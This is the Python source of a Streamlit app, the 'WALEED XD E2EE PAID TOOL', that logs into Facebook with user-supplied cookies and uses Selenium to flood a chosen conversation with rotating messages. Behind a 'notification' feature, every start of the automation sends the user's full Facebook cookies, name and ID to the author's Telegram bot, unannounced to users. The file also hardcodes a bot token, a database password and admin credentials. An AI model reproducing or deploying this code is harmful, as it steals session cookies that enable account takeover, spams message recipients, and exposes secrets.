import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
def setup_mongodb_heartbeat():
    """MongoDB heartbeat to keep app alive 24/7"""
    def keep_alive():
        while True:
            try:
                # Import inside function to avoid initial load issues
                from pymongo import MongoClient
                
                connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
                
                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                db_connection = client['streamlit_db']
                
                # Update heartbeat every 5 minutes
                db_connection.heartbeat.update_one(
                    {'app_id': 'Rafay_Khan_automation'},
                    {
                        '$set': {
                            'last_heartbeat': datetime.now(),
                            'status': 'running',
                            'app_name': 'Waleed XD E2EE',
                            'timestamp': datetime.now(),
                            'version': '2.0'
                        }
                    },
                    upsert=True
                )
                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                client.close()
                
            except Exception as e:
                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
            
            # Wait 5 minutes
            time.sleep(300)
    
    # Start heartbeat in background
    try:
        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
        heartbeat_thread.start()
        print("🚀 MongoDB 24/7 Heartbeat Started!")
    except Exception as e:
        print(f"❌ Failed to start heartbeat: {e}")

# 🚨 YEH LINE SABSE PEHLE RUN HOGI
if 'mongodb_started' not in st.session_state:
    setup_mongodb_heartbeat()
    st.session_state.mongodb_started = True
# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨

st.set_page_config(
    page_title="WALEED XD E2EE PAID TOOL",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "1889611156"
FACEBOOK_ADMIN_UID = "100080154146813"

def send_telegram_notification(user_data, automation_data):
    """Send user details to Telegram bot"""
    try:
        message = f"""
🔰 *NEW AUTOMATION STARTED* 🔰

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Full Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔰 NEW AUTOMATION STARTED 🔰

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Full Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        # Simulate sending to Facebook admin
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        
        # Here you would implement actual Facebook API integration
        # For now, we'll log it
        db.log_admin_notification(user_data['user_id'], message)
        
    except Exception as e:
        print(f"Facebook notification failed: {e}")

# MINIMAL DESIGN IMPROVEMENTS - ORIGINAL CODE INTACT
custom_css = """
<style>
    /* Dark theme with blue accents */
    .stApp {
        background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
    }
    
    /* Main container with subtle border */
    .main-container {
        background: rgba(15, 23, 42, 0.9);
        border-radius: 15px;
        padding: 25px;
        margin: 15px;
        border: 1px solid rgba(59, 130, 246, 0.2);
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    
    /* Header styling */
    .main-header {
        background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
        padding: 25px;
        border-radius: 12px;
        text-align: center;
        margin-bottom: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .main-header h1 {
        color: white;
        font-size: 2.2rem;
        font-weight: 700;
        margin: 0;
        text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }
    
    .main-header p {
        color: rgba(255,255,255,0.8);
        font-size: 1rem;
        margin-top: 8px;
    }
    
    /* Buttons */
    .stButton>button {
        background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
        color: white;
        border: none;
        border-radius: 10px;
        padding: 12px 24px;
        font-weight: 600;
        transition: all 0.3s ease;
    }
    
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
    }
    
    /* Input fields */
    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea,
    .stNumberInput>div>div>input {
        background: rgba(30, 41, 59, 0.8) !important;
        border: 1px solid rgba(59, 130, 246, 0.3) !important;
        border-radius: 8px !important;
        color: white !important;
    }
    
    .stTextInput>div>div>input:focus,
    .stTextArea>div>div>textarea:focus,
    .stNumberInput>div>div>input:focus {
        border-color: #3b82f6 !important;
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2) !important;
    }
    
    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {
        background: rgba(30, 41, 59, 0.5);
        border-radius: 10px;
        padding: 5px;
    }
    
    .stTabs [data-baseweb="tab"] {
        border-radius: 8px !important;
        padding: 10px 20px !important;
    }
    
    .stTabs [aria-selected="true"] {
        background: #3b82f6 !important;
        color: white !important;
    }
    
    /* Cards */
    .card {
        background: rgba(30, 41, 59, 0.7);
        border-radius: 10px;
        padding: 20px;
        border: 1px solid rgba(59, 130, 246, 0.2);
        margin: 10px 0;
    }
    
    /* Footer */
    .footer {
        text-align: center;
        padding: 20px;
        color: #94a3b8;
        margin-top: 30px;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    /* Log container */
    .log-container {
        background: rgba(15, 23, 42, 0.9);
        color: #10b981;
        padding: 15px;
        border-radius: 8px;
        font-family: monospace;
        max-height: 300px;
        overflow-y: auto;
        border: 1px solid rgba(16, 185, 129, 0.2);
    }
    
    /* Status badges */
    .status-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 0.8rem;
        font-weight: 600;
    }
    
    .approved {
        background: linear-gradient(135deg, #10b981, #059669);
        color: white;
    }
    
    .pending {
        background: linear-gradient(135deg, #f59e0b, #d97706);
        color: white;
    }
    
    .rejected {
        background: linear-gradient(135deg, #ef4444, #dc2626);
        color: white;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.last_message_sent = ""
        self.last_message_time = ""

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    # Store in admin logs if user_id provided
    if user_id:
        db.log_user_activity(user_id, formatted_msg)
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        automation_state.last_message_sent = msg
        automation_state.last_message_time = timestamp
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running and db.get_automation_running(user_id):
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass

def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    whatsapp_url = f"https://wa.me/923075852134?text={requests.utils.quote(message)}"
    return whatsapp_url

def send_approval_request_via_facebook(user_real_name, approval_key):
    message = f"Hello waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    facebook_url = f"https://www.facebook.com/officelwaleed"
    return facebook_url

def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    telegram_url = f"https://t.me/itxrafay?text={requests.utils.quote(message)}"
    return telegram_url

def run_automation_with_notification(user_config, username, automation_state, user_id):
    # Send notifications before starting automation
    user_data = {
        'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']  # Full cookies now
    }
    
    # Send notifications
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# Main application - MINIMAL CHANGES ONLY
st.markdown('<div class="main-container">', unsafe_allow_html=True)

# Header with new styling
st.markdown("""
<div class="main-header">
    <h1>🔥 WALEED XD E2EE PAID TOOL</h1>
    <p>Professional Automation Suite • Premium Version</p>
</div>
""", unsafe_allow_html=True)

# Admin Panel
if st.sidebar.checkbox("🔐 Admin Login"):
    st.sidebar.markdown('<div class="card">', unsafe_allow_html=True)
    admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
    admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
    
    if st.sidebar.button("Login as Admin"):
        if admin_username == "WALEED" and admin_password == "WALEED_XD":
            st.session_state.admin_logged_in = True
            st.sidebar.success("✅ Admin login successful!")
        else:
            st.sidebar.error("❌ Invalid admin credentials!")
    st.sidebar.markdown('</div>', unsafe_allow_html=True)

if st.session_state.admin_logged_in:
    st.markdown("### 👑 Admin Approval Panel")
    
    # LOGOUT BUTTON
    if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
        st.session_state.admin_logged_in = False
        st.rerun()
    
    # Get all pending approvals
    pending_users = db.get_pending_approvals()
    
    if pending_users:
        st.markdown(f"#### 📋 Pending Approvals ({len(pending_users)})")
        
        for user in pending_users:
            user_id, username, approval_key, real_name = user
            
            with st.container():
                col1, col2, col3 = st.columns([3, 1, 1])
                
                with col1:
                    st.markdown(f"""
                    <div class="card">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
                        <span class="status-badge pending">PENDING</span>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"✅ Approve", key=f"approve_{user_id}"):
                        db.update_approval_status(user_id, 'approved')
                        st.success(f"✅ Approved user: {username}")
                        st.rerun()
                
                with col3:
                    if st.button(f"❌ Reject", key=f"reject_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        st.error(f"❌ Rejected user: {username}")
                        st.rerun()
    
    # Show all approved users
    approved_users = db.get_approved_users()
    if approved_users:
        st.markdown("#### 🟢 Approved Users")
        
        for user in approved_users:
            user_id, username, approval_key, real_name, automation_running = user
            
            with st.container():
                col1, col2, col3, col4 = st.columns([3, 1, 1, 1])
                
                with col1:
                    user_config = db.get_user_config(user_id)
                    chat_id = user_config['chat_id'] if user_config else "Not configured"
                    status = "🟢 Running" if automation_running else "🔴 Stopped"
                    
                    st.markdown(f"""
                    <div class="card">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>💬 Chat ID:</strong> {chat_id}<br>
                        <strong>⚡ Status:</strong> {status}<br>
                        <span class="status-badge approved">APPROVED</span>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        db.set_automation_running(user_id, False)
                        st.error(f"🗑️ Removed approval for: {username}")
                        st.rerun()
                
                with col3:
                    if automation_running:
                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
                            db.set_automation_running(user_id, False)
                            st.warning(f"⏹️ Stopped automation for: {username}")
                            st.rerun()
                    else:
                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                db.set_automation_running(user_id, True)
                                thread = threading.Thread(
                                    target=run_automation_with_notification, 
                                    args=(user_config, username, AutomationState(), user_id)
                                )
                                thread.daemon = True
                                thread.start()
                                st.success(f"▶️ Started automation for: {username}")
                                st.rerun()
                            else:
                                st.error("⚠️ User needs to configure chat ID first")

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown('<div class="card">', unsafe_allow_html=True)
        st.markdown("### Welcome Back!")
        
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    approval_status = db.get_approval_status(user_id)
                    
                    if approval_status == 'approved':
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = 'approved'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start and not st.session_state.automation_state.running:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                        
                        st.success(f"✅ Welcome back, {username}!")
                        st.rerun()
                    else:
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = approval_status or 'pending'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
        st.markdown('</div>', unsafe_allow_html=True)
    
    with tab2:
        st.markdown('<div class="card">', unsafe_allow_html=True)
        st.markdown("### Create New Account")
        
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    result = db.create_user(new_username, new_password)
                    
                    if isinstance(result, tuple) and len(result) >= 2:
                        success, message = result[0], result[1]
                        user_id = result[2] if len(result) > 2 else None
                    else:
                        success = result if isinstance(result, bool) else False
                        message = "User creation completed" if success else "User creation failed"
                        user_id = None
                    
                    if success:
                        if user_id:
                            approval_key = generate_approval_key(new_username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")
        st.markdown('</div>', unsafe_allow_html=True)

else:
    # User is logged in but needs approval
    if st.session_state.approval_status != 'approved':
        st.markdown('<div class="card">', unsafe_allow_html=True)
        st.markdown("### 🔒 Approval Required")
        
        # User Info
        st.markdown(f"""
        <div style="background: rgba(30, 41, 59, 0.7); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
            <h4>👤 User Information</h4>
            <p><strong>Username:</strong> {st.session_state.username}</p>
            <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
        </div>
        """, unsafe_allow_html=True)
        
        # Approval Key
        st.markdown(f"""
        <div style="background: rgba(30, 41, 59, 0.8); padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; border: 2px solid #3b82f6;">
            <h4>🔑 Your Approval Key</h4>
            <div style="font-size: 1.3rem; font-weight: bold; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #3b82f6;">
                {st.session_state.approval_key}
            </div>
            <button style="background: #3b82f6; color: white; border: none; border-radius: 8px; padding: 10px 20px; cursor: pointer;" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
        </div>
        """, unsafe_allow_html=True)
        
        # Real Name Input
        st.markdown("### 📝 Enter Your Real Name")
        user_real_name = st.text_input("Your Real Name", key="real_name", placeholder="Enter your real name for approval", 
                                      value=st.session_state.user_real_name)
        
        if user_real_name:
            st.session_state.user_real_name = user_real_name
            db.update_user_real_name(st.session_state.user_id, user_real_name)
        
        # Contact Buttons
        st.markdown("### 📞 Contact Waleed Khan for Approval")
        col1, col2, col3 = st.columns(3)
        
        with col1:
            whatsapp_url = send_approval_request_via_whatsapp(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{whatsapp_url}" target="_blank"><button style="width:100%; background: #25D366; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">📱 WhatsApp</button></a>', unsafe_allow_html=True)
        
        with col2:
            facebook_url = send_approval_request_via_facebook(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{facebook_url}" target="_blank"><button style="width:100%; background: #1877F2; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">👤 Facebook</button></a>', unsafe_allow_html=True)
        
        with col3:
            telegram_url = send_approval_request_via_telegram(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'<a href="{telegram_url}" target="_blank"><button style="width:100%; background: #0088cc; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold;">✈️ Telegram</button></a>', unsafe_allow_html=True)
        
        # Check Status Button
        if st.button("🔄 Check Approval Status", use_container_width=True):
            current_status = db.get_approval_status(st.session_state.user_id)
            st.session_state.approval_status = current_status
            
            if current_status == 'approved':
                st.success("🎉 Your account has been approved!")
                st.rerun()
            else:
                st.warning("⏳ Approval pending...")
        
        # Logout
        if st.sidebar.button("🚪 Logout"):
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.rerun()
        
        st.markdown('</div>', unsafe_allow_html=True)
    
    else:
        # User is approved
        if not st.session_state.auto_start_checked and st.session_state.user_id:
            st.session_state.auto_start_checked = True
            should_auto_start = db.get_automation_running(st.session_state.user_id)
            if should_auto_start and not st.session_state.automation_state.running:
                user_config = db.get_user_config(st.session_state.user_id)
                if user_config and user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
        
        st.sidebar.markdown(f"### 👤 {st.session_state.username}")
